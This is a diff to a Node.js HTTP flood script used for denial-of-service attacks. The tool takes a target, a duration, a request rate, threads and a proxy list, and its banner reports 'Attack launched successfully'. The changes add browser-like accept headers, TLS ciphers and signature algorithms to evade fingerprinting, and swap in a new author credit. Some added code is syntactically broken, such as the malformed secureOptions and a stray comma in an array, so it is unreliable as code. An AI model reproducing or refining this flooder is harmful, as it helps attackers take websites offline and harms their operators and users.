@@ -5,6 +5,7 @@ const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
+const http = require('http');
 const os = require("os");
 const colors = require("colors");
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
@@ -20,7 +21,42 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  ],
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
+      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json;q=0.9",
+  "text/html, application/xhtml+xml, application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.8",
+  "application/json, text/plain, */*",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7",
+  "application/json, text/plain, */*;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.5",
+  "application/json, text/javascript, */*; q=0.01",
+  "application/json, text/plain, */*",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.5,application/json;q=0.8",
+  "text/html, application/xml;q=0.9, image/webp, *;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.6,application/json;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.6,application/json;q=0.8",
+  "application/json, text/plain, */*",
+  "application/json, text/javascript, */*; q=0.01",
+  "application/json, text/plain, */*",
+  "application/json;q=0.9, text/plain;q=0.8, */*;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7,application/json;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json;q=0.9",
+  "text/html, application/xhtml+xml, application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.8",
+  "application/json, text/plain, */*",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7",
+  "application/json, text/plain, */*;q=0.7"
+ ],
+
 
   cache_header = [
     'max-age=0',
@@ -155,7 +191,13 @@ language_header = [
   "TLS_AES_128_CCM_SHA256",
   "TLS_CHACHA20_POLY1305_SHA256",
   "TLS_AES_256_GCM_SHA384",
-  "TLS_AES_128_GCM_SHA256"
+  "TLS_AES_128_GCM_SHA256",
+   "TLS_CHACHA20_POLY1305_SHA256",
+   "TLS_AES_128_GCM_SHA256",
+   "ECDHE-RSA-AES256-GCM-SHA384",
+  "ECDHE-RSA-AES128-GCM-SHA256",
+   "ECDHE-ECDSA-AES256-GCM-SHA384",
+    "ECDHE-ECDSA-AES128-GCM-SHA256",
  ];
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
   process.setMaxListeners(0);
@@ -168,26 +210,49 @@ language_header = [
           "rsa_pss_rsae_sha384",
           "rsa_pkcs1_sha384",
           "rsa_pss_rsae_sha512",
-          "rsa_pkcs1_sha512"
+          "rsa_pkcs1_sha512",
+          "ecdsa_secp256r1_sha256",
+        "ecdsa_secp384r1_sha384",
+        "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
+         , 'dsa_sha256',
+	"dsa_sha384",
+	"dsa_sha512",
+	"dsa_sha224", 
+	"dsa_sha1",
 ]
   let SignalsList = sigalgs.join(':')
 const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
 const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
- crypto.constants.SSL_OP_NO_SSLv3 |
- crypto.constants.SSL_OP_NO_TLSv1 |
- crypto.constants.SSL_OP_NO_TLSv1_1 |
- crypto.constants.SSL_OP_NO_TLSv1_3 |
- crypto.constants.ALPN_ENABLED |
- crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
- crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
- crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
- crypto.constants.SSL_OP_COOKIE_EXCHANGE |
- crypto.constants.SSL_OP_PKCS1_CHECK_1 |
- crypto.constants.SSL_OP_PKCS1_CHECK_2 |
- crypto.constants.SSL_OP_SINGLE_DH_USE |
- crypto.constants.SSL_OP_SINGLE_ECDH_USE |
- crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+crypto.constants.SSL_OP_NO_SSLv3 |
+crypto.constants.SSL_OP_NO_TLSv1 |
+crypto.constants.SSL_OP_NO_TLSv1_1 |
+crypto.constants.ALPN_ENABLED |
+crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+crypto.constants.SSL_OP_PKCS1_CHECK_1 |
+crypto.constants.SSL_OP_PKCS1_CHECK_2 |
+crypto.constants.SSL_OP_SINGLE_DH_USE |
+crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+crypto.constants.SSL_OP_NO_RENEGOTIATION |
+crypto.constants.SSL_OP_NO_TICKET |
+crypto.constants.SSL_OP_NO_COMPRESSION |
+crypto.constants.SSL_OP_NO_RENEGOTIATION |
+crypto.constants.SSL_OP_TLSEXT_PADDING |
+crypto.constants.SSL_OP_ALL |
+crypto.constants.SSL_OP_NO_RENEGOTIATION
+crypto.constants.SSL_OP_NO_SSLv2,
+crypto.constants.SSL_OP_NO_SSLv3,
+crypto.constants.SSL_OP_NO_TLSv1,
+crypto.constants.SSL_OP_NO_TLSv1_1, 
+crypto.constants.ALPN_ENABLED,
+crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE,
+crypto.constants.SSL_OP_NO_TICKET,
+crypto.constants.SSL_OP_NO_COMPRESSION,
+crypto.constants.SSL_OP_TLSEXT_PADDING,
+crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
  if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`); process.exit();}
  const secureProtocol = "TLS_method";
  const headers = {};
@@ -211,12 +276,12 @@ const secureOptions =
  var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
 
- const MAX_RAM_PERCENTAGE = 80;
+ const MAX_RAM_PERCENTAGE = 85;
 const RESTART_DELAY = 1000;
 
 if (cluster.isMaster) {
     console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log(` BY HOANG THANH TUNG`.red.bold);
+    console.log(` BY HO NHAT THUAN`.red.bold);
     console.log("═════════════════════════════════════════════════════════════".gray);
     console.log(` >> Target       : `.brightYellow + process.argv[2]);
     console.log(` >> Duration     : `.brightYellow + process.argv[3] + " seconds");
@@ -226,7 +291,7 @@ if (cluster.isMaster) {
     console.log("═════════════════════════════════════════════════════════════".gray);
     console.log(` [!] Attack launched successfully`.brightRed);
     console.log("═════════════════════════════════════════════════════════════".gray);
-    console.log("TUNG  | flood".yellow.bold);
+    console.log("THUAN  | flood".yellow.bold);
     
     const restartScript = () => {
         for (const id in cluster.workers) {
@@ -245,7 +310,7 @@ if (cluster.isMaster) {
     const handleRAMUsage = () => {
         const totalRAM = os.totalmem();
         const usedRAM = totalRAM - os.freemem();
-        const ramPercentage = (usedRAM / totalRAM) * 100;
+        const ramPercentage = (usedRAM / totalRAM) * 110;
 
         if (ramPercentage >= MAX_RAM_PERCENTAGE) {
             console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
@@ -338,7 +403,7 @@ return result;
     }
     return result;
 }
-const randstrsValue = randstrs(10);
+const randstrsValue = randstrs(11);
   function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
@@ -639,3 +704,4 @@ setTimeout(StopScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
+
